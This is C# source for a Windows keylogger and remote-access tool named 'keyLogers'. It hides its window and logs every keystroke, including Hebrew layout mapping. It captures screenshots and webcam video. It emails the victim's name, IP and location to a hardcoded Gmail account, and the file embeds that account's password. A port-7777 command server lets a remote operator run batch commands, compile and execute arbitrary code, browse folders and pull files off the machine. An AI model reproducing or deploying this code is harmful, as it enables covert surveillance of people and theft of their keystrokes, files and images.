using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using myClass;
using System.Threading;
//file
using System.IO;
//Drawing
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
//Capture
using DirectX.Capture;
//runCode
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Reflection;

namespace keyLogers
{
    static class Program
    {
        static FormProperties Properties;
        static keyLoger reader;
        static string data = "", dataN = "";
        static int len = 0, newLine = 10, sleepImg = 30;
        static int countVoidFont = 1;
        static Capture capture;
        static list<Thread> whileTrue;
        /// <id whileTrue>
        /// imgAllVoid = 0
        /// reader.start = 1
        /// screenImg = 2
        /// beep1 = 3
        /// beep2 = 4
        /// beep3 = 5
        /// beepR = 6
        /// </id whileTrue>
        static void Main()
        {
            string sendMailMas = "name = " + myClass.defrent.nameComputer() + "\nip = " + myClass.defrent.ipComputer() + "\ntime start = " + DateTime.Now.ToString() + "\nLocation = {" + myClass.defrent.locationComputer() + "}";
            Properties = new FormProperties();
            hidesSoftware.Look = false;
            Properties.ShowDialog();
            hidesSoftware.Look = true;

            if (Properties.textBoxPassword.Text != "poi1595poi1595")
            {
                MessageBox.Show("ero in password");
                return;
            }
            sleepImg = Properties.TimeTab;
            createSave();
            write("ip: " + myClass.defrent.ipComputer());
            if (myClass.defrent.ipComputer() == "127.0.0.1")
            {
                Console.Write(" (No network)");
            }
            if (Properties.checkBoxSendMail.Checked)
            {
                myClass.defrent.sendMail("omer2079@gmail.com", "poi1595poi1595poi1595", "omer2079@gmail.com", "keyLogers[" + myClass.defrent.nameComputer() + "]", sendMailMas);
            }
            try
            {
                Filters filters = new Filters();
                capture = new Capture(filters.VideoInputDevices[0], filters.AudioInputDevices[0]);
                capture.Filename = myClass.myData.Sava + @"\front camera\video" + countVoidFont + ".avi";
            }
            catch
            {
                capture = null;
                write("VideoFont: false");
            }
            myServer.port = 7777;
            myServer.get = getChat;
            whileTrue = new list<Thread>(new Thread(voidTh.imgAllVoid));//0
            reader = new keyLoger(tik);
            whileTrue.add(new Thread(reader.start));//1
            whileTrue.add(new Thread(screenImg));//2
            whileTrue.add(new Thread(voidTh.beep1));//3
            whileTrue.add(new Thread(voidTh.beep2));//4
            whileTrue.add(new Thread(voidTh.beep3));//5
            whileTrue.add(new Thread(voidTh.beepR));//6
            reader = new keyLoger(tik);
            whileTrue.getValue(1).Start();
            whileTrue.getValue(2).Start();
            hidesSoftware.Look = false;
            myServer.start();
        }
        static void createSave()
        {
            files.deletFolder(myData.Sava + @"\screen");
            Directory.CreateDirectory(myData.Sava + @"\screen");
            files.deletFolder(myData.Sava + @"\Window");
            Directory.CreateDirectory(myData.Sava + @"\Window");
            files.deletFolder(myData.Sava + @"\front camera");
            Directory.CreateDirectory(myData.Sava + @"\front camera");
            if (File.Exists(myData.Sava + @"\logout.txt"))
                File.Delete(myData.Sava + @"\logout.txt");
            if (File.Exists(myData.Sava + @"\logoutKeys.txt"))
                File.Delete(myData.Sava + @"\logoutKeys.txt");
            File.AppendAllText(myData.Sava + @"\logout.txt", "");
            File.AppendAllText(myData.Sava + @"\logoutKeys.txt", "");
            myData dataOption = new myData("data");
            dataOption.add("name", "Window");
            dataOption.add("time", "" + sleepImg);
            dataOption.close();
            write("folder: " + dataOption.url());
            
        }
        static string Read(string text)
        {
            Console.Write(text);
            string w = Console.ReadLine();
            Console.Clear();
            return w;
        }
        static void writeOnBord(string text, int x, int y)
        {
            int t = Console.CursorTop, l = Console.CursorLeft;
            Console.CursorTop = y;
            Console.CursorLeft = x;
            Console.Write(text);
            Console.CursorTop = t;
            Console.CursorLeft = l;
        }
        static string getLanguage()
        {
            System.Diagnostics.Process.Start(Application.StartupPath + @"\languageToTxt.exe", "");
            Thread.Sleep(100);
            return File.ReadAllText(Application.StartupPath + @"\language.txt");
        }
        static void runCode(string Code, bool all = false)
        {
            string code = @"
            using System;
            namespace First
            {
                public class Program
                {
                    public static void Main()
                    {
                        " +
                        Code
                        + @"
                    }
                }
            }
            ";
            if (all)
                code = Code;
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            // Reference to System.Drawing library
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            // True - memory generation, false - external file generation
            parameters.GenerateInMemory = true;
            // True - exe file generation, false - dll file generation
            parameters.GenerateExecutable = true;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }

                throw new InvalidOperationException(sb.ToString());
            }
            Assembly assembly = results.CompiledAssembly;
            Type program = assembly.GetType("First.Program");
            MethodInfo main = program.GetMethod("Main");
            main.Invoke(null, null);
        }
        static string tvToPrintTv(Keys tv)
        {
            string ret = tv + "";
            if (tv - Keys.NumPad0 >= 0 && tv - Keys.NumPad0 <= 9)
            {
                ret = tv.ToString()[6] + "";
            }
            else if ('A' <= ret[0] && ret[0] <= 'Z' && ret.Length == 1)
            {
                if (getLanguage() == "en-US")
                {
                    if (!Console.CapsLock && getLanguage() == "en-US")
                    {
                        ret = "" + (char)(ret[0] - 'A' + 'a');
                    }
                }
                else
                {
                    switch (ret)
                    {
                        case "T":
                            {
                                ret = "א";
                            }
                            break;
                        case "C":
                            {
                                ret = "ב";
                            }
                            break;
                        case "D":
                            {
                                ret = "ג";
                            }
                            break;
                        case "S":
                            {
                                ret = "ד";
                            }
                            break;
                        case "V":
                            {
                                ret = "ה";
                            }
                            break;
                        case "U":
                            {
                                ret = "ו";
                            }
                            break;
                        case "Z":
                            {
                                ret = "ז";
                            }
                            break;
                        case "J":
                            {
                                ret = "ח";
                            }
                            break;
                        case "Y":
                            {
                                ret = "ט";
                            }
                            break;
                        case "H":
                            {
                                ret = "י";
                            }
                            break;
                        case "F":
                            {
                                ret = "כ";
                            }
                            break;
                        case "L":
                            {
                                ret = "ך";
                            }
                            break;
                        case "K":
                            {
                                ret = "ל";
                            }
                            break;
                        case "N":
                            {
                                ret = "מ";
                            }
                            break;
                        case "O":
                            {
                                ret = "ם";
                            }
                            break;
                        case "B":
                            {
                                ret = "נ";
                            }
                            break;
                        case "I":
                            {
                                ret = "ן";
                            }
                            break;
                        case "X":
                            {
                                ret = "ס";
                            }
                            break;
                        case "G":
                            {
                                ret = "ע";
                            }
                            break;
                        case "P":
                            {
                                ret = "פ";
                            }
                            break;
                        case "M":
                            {
                                ret = "צ";
                            }
                            break;
                        case "OemPeriod":
                            {
                                ret = "ץ";
                            }
                            break;
                        case "E":
                            {
                                ret = "ק";
                            }
                            break;
                        case "R":
                            {
                                ret = "ר";
                            }
                            break;
                        case "A":
                            {
                                ret = "ש";
                            }
                            break;
                        case "Oemcomma":
                            {
                                ret = "ת";
                            }
                            break;
                    }
                }
            }
            return ret;
        }
        public static void write(string text)
        {
            Console.WriteLine(DateTime.Now + " " + text);
        }

        static Keys last = Keys.A;
        static int loadLen = 0;
        static void tik(Keys tv)//get keeybord
        {
            try
            {
                string add = tv + "";
                string addN = add;
                if (tv == Keys.LButton || tv == Keys.RButton)
                {
                    add += keyLoger.mouseLocation();
                    addN = add;
                }
                else
                {
                    add = tvToPrintTv(tv);
                }
                if (loadLen == len)
                {
                    data += add + ", ";
                    dataN += addN + ", ";
                }
                else
                {
                    loadLen++;
                    data += add + Environment.NewLine;
                    dataN += addN + Environment.NewLine;
                }
                File.WriteAllText(myData.Sava + @"\logout.txt", data);
                File.WriteAllText(myData.Sava + @"\logoutKeys.txt", dataN);
            }
            catch
            {
                write("ero: getTv");
            }
        }
        static void screenImg()//screen imgs
        {
                while (true)
                {
                    Thread.Sleep(sleepImg);
                    try
                    {
                        writeOnBord("img: " + len, Console.BufferWidth - 10, 1);
                        var screen = ScreenCapture.CaptureActiveWindow();
                        var Window = ScreenCapture.CaptureDesktop();
                        if (!File.Exists(myData.Sava + @"\screen\img" + len + ".jpg"))
                            screen.Save(myData.Sava + @"\screen\img" + len + ".jpg", ImageFormat.Jpeg);
                        else
                            write("ero screen " + len);
                        if (!File.Exists(myData.Sava + @"\Window\img" + len + ".jpg"))
                            Window.Save(myData.Sava + @"\Window\img" + len + ".jpg", ImageFormat.Jpeg);
                        else
                            write("ero Window " + len);
                    }
                    catch
                    {
                        write("ero: screenImg" + len);
                    }
                    len++;
                }
        }
        public static void getChat(string name, string cmd)//chat comend
        {
            try
            {
                if (cmd == "conect" || cmd == "remove")
                {
                    write("[" + name + "] " + cmd);
                    return;
                }
                string nameCmd = cmd.Split(';')[0];
                if (nameCmd != "copyFileAc")
                    write("[" + name + "] " + nameCmd);
                string bodyCmd = "";
                if (cmd.Split(';').Length > 1)
                    bodyCmd = cmd.Split(';')[1];
                switch (nameCmd)
                {
                    case "end":
                        {
                            Environment.Exit(Environment.ExitCode);
                        }
                        break;
                    case "stop reader":
                        {
                            whileTrue.getValue(1).Abort();
                        }
                        break;
                    case "stop img":
                        {
                            whileTrue.getValue(2).Abort();
                        }
                        break;
                    case "start reader":
                        {
                            whileTrue.setValue(1, new Thread(reader.start));
                            whileTrue.getValue(1).Start();
                        }
                        break;
                    case "start img":
                        {
                            whileTrue.setValue(2, new Thread(screenImg));
                            whileTrue.getValue(2).Start();
                        }
                        break;
                    case "clearBord":
                        {
                            Console.Clear();
                        }
                        break;
                    case "mail":
                        {
                            myClass.defrent.sendMail("omer2079@gmail.com", "poi1595poi1595poi1595", "omer2079@gmail.com", "keyLogers[" + myClass.defrent.nameComputer() + "]", "keepbord:" + Environment.NewLine + data);
                        }
                        break;
                    case "look":
                        {
                            hidesSoftware.Look = !hidesSoftware.Look;
                        }
                        break;
                    case "hide":
                        {
                            hidesSoftware.Look = false;
                        }
                        break;
                    case "cmd":
                        {
                            string url = myData.Sava + @"\bat.bat";
                            if (!File.Exists(url))
                                File.AppendAllText(url, bodyCmd);
                            else
                                File.WriteAllText(url, bodyCmd);
                            System.Diagnostics.Process.Start(url);
                        }
                        break;
                    case "frontCam":
                        {
                            if (capture == null)
                                return;
                            if (capture.Stopped)
                            {
                                capture.Start();
                            }
                            else
                            {
                                capture.Stop();
                                writeOnBord("video: " + countVoidFont, Console.BufferWidth - 10, 2);
                                Filters filters = new Filters();
                                capture = new Capture(filters.VideoInputDevices[0], filters.AudioInputDevices[0]);
                                countVoidFont++;
                                capture.Filename = myClass.myData.Sava + @"\front camera\video" + countVoidFont + ".avi";
                            }
                        }
                        break;
                    case "getData":
                        {
                            myServer.broadcast(name, "getDataTo;\nimg = " + len + "\nvoied = " + countVoidFont + "\nLocation = {" + myClass.defrent.locationComputer() + "}:" + myClass.defrent.locationComputer());
                        }
                        break;
                    case "getUrl":
                        {
                            string ret = "";
                            string[] urls = files.readFolder(bodyCmd);
                            foreach (var item in urls)
                            {
                                ret += item + Environment.NewLine;
                            }
                            myServer.broadcast(name, "getUrlTo;" + ret);
                        }
                        break;
                    case "copyFile":
                        {
                            write("good: " + bodyCmd);
                            Thread.Sleep(3000);
                            byte[] ret = File.ReadAllBytes(bodyCmd);
                            myServer.broadcast(name, "copyFileAc;" + bodyCmd + ";" + File.Exists(bodyCmd), ret);
                        }
                        break;
                    case "say":
                        {
                            sayBody = bodyCmd;
                            Thread th = new Thread(voidTh.say);
                            th.Start();
                        }
                        break;
                    case "imgAll":
                        {
                            sayBody = "";
                            if (whileTrue.getValue(0).IsAlive)
                            {
                                sayBody = "stopImg";
                                Thread.Sleep(5);
                                whileTrue.getValue(0).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(0, new Thread(voidTh.imgAllVoid));
                                whileTrue.getValue(0).Start();
                            }
                        }
                        break;
                    case "imgAll2":
                        {
                            sayBody = null;
                            if (whileTrue.getValue(0).IsAlive)
                            {
                                sayBody = "stopImg";
                                Thread.Sleep(5);
                                whileTrue.getValue(0).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(0, new Thread(voidTh.imgAllVoid));
                                whileTrue.getValue(0).Start();
                            }
                        }
                        break;
                    case "imgAllFile":
                        {
                            sayBody = bodyCmd;
                            if (whileTrue.getValue(0).IsAlive)
                            {
                                sayBody = "stopImg";
                                Thread.Sleep(5);
                                whileTrue.getValue(0).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(0, new Thread(voidTh.imgAllVoid));
                                whileTrue.getValue(0).Start();
                            }
                        }
                        break;
                    case "setText":
                        {
                            myClass.SetCeepBord.setText(bodyCmd);
                        }
                        break;
                    case "setTextS":
                        {
                            myClass.SetCeepBord.setText(bodyCmd, true);
                        }
                        break;
                    case "volumeUp":
                        {
                            myClass.SetCeepBord.setUpDown(true);
                        }
                        break;
                    case "volumeDown":
                        {
                            myClass.SetCeepBord.setUpDown(false);
                        }
                        break;
                    case "volume":
                        {
                            myClass.SetCeepBord.setVolumeMute();
                        }
                        break;
                    case "beep":
                        {
                            myClass.SetCeepBord.HandPlay();
                        }
                        break;
                    case "setMouse":
                        {
                            string[] arr = bodyCmd.Split(':');
                            myClass.SetCeepBord.setMouse(int.Parse(arr[0]), int.Parse(arr[1]));
                        }
                        break;
                    case "beep1":
                        {
                            if (whileTrue.getValue(3).IsAlive)
                            {
                                whileTrue.getValue(3).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(3, new Thread(voidTh.beep1));
                                whileTrue.getValue(3).Start();
                            }
                        }
                        break;
                    case "beep2":
                        {
                            if (whileTrue.getValue(4).IsAlive)
                            {
                                whileTrue.getValue(4).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(4, new Thread(voidTh.beep2));
                                whileTrue.getValue(4).Start();
                            }
                        }
                        break;
                    case "beep3":
                        {
                            if (whileTrue.getValue(5).IsAlive)
                            {
                                whileTrue.getValue(5).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(5, new Thread(voidTh.beep3));
                                whileTrue.getValue(5).Start();
                            }
                        }
                        break;
                    case "beepR":
                        {
                            if (whileTrue.getValue(6).IsAlive)
                            {
                                whileTrue.getValue(6).Abort();
                            }
                            else
                            {
                                whileTrue.setValue(6, new Thread(voidTh.beepR));
                                whileTrue.getValue(6).Start();
                            }
                        }
                        break;
                    case "runCode":
                        {
                            CodeRunS = sayBody;
                            CodeRunB = false;
                            voidTh.CodeRun();
                            //Thread th = new Thread(voidTh.CodeRun);
                            //th.Start();
                        }
                        break;
                    case "runCodeAll":
                        {
                            CodeRunS = sayBody;
                            CodeRunB = true;
                            Thread th = new Thread(voidTh.CodeRun);
                            th.Start();
                        }
                        break;
                }
            }
            catch
            {
                write("ero: chat");
            }
        }
        public static string sayBody, CodeRunS;
        public static bool CodeRunB;

        public static class voidTh
        {
            public static void say()
            {
                MessageBox.Show(sayBody);
            }
            public static void imgAllVoid()
            {
                try
                {
                    myClass.ImageAll fom = new ImageAll();
                    fom.stop = true;
                    fom.fileName = sayBody;
                    fom.Show();
                    while (sayBody != "stopImg") ;
                    fom.Close();
                }
                catch
                {
                    write("ero: imgAllVoid");
                }
            }
            public static void beep1()
            {
                while (true)
                {
                    Console.Beep(2000, 750);
                    Console.Beep(1700, 750);
                    Console.Beep(1600, 750);
                    Console.Beep(1800, 750);
                    Console.Beep(1500, 750);
                }
            }
            public static void beep2()
            {
                while (true)
                {
                    Console.Beep(2000, 100);
                    Console.Beep(1700, 100);
                    Console.Beep(1600, 100);
                    Console.Beep(1800, 100);
                    Console.Beep(1500, 100);
                }
            }
            public static void beep3()
            {
                while (true)
                {
                    Console.Beep(2000, 100);
                    Console.Beep(1700, 400);
                    Console.Beep(1600, 750);
                    Console.Beep(1800, 100);
                    Console.Beep(1500, 400);
                }
            }
            public static void beepR()
            {
                Random r = new Random();
                while (true)
                {
                    Console.Beep(r.Next(1000, 3000), r.Next(100, 1000));
                }
            }
            public static void CodeRun()
            {
                Program.runCode(CodeRunS, CodeRunB);
            }
        }
    }
}
